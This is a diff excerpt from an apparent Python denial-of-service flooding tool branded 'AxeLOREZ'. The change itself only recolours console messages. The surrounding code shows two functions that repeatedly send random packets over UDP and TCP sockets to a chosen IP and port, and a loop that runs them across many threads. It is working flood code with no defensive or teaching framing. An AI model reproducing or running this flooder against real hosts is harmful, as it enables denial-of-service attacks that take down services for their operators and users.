@@ -36,9 +36,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(f" \033[92m[•] AxeLOREZ Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")
+			print(f" \033[92m[•] AxeLOREZ Attack Ip \033[94m{ip} \033[94mPort \033[94m{port} \033[94m!!!")
 		except:
-			print(f" \033[92m[×] AxeLOREZ Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")
+			print(f" \033[92m[×] AxeLOREZ Attack Ip \033[94m{ip} \033[94mPort \033[94m{port} \033[94m!!!")
 
 def run2():
 	data = random._urandom(16)
@@ -49,9 +49,9 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(f" \033[92m[•] AxeLOREZ Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")
+			print(f" \033[92m[•] AxeLOREZ Attack Ip \033[94m{ip} \033[94mPort \033[94m{port} \033[94m!!!")
 		except:
-			print(f" \033[92m[×] AxeLOREZ Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")
+			print(f" \033[92m[×] AxeLOREZ Attack Ip \033[94m{ip} \033[94mPort \033[94m{port} \033[94m!!!")
 
 for y in range(threads):
 
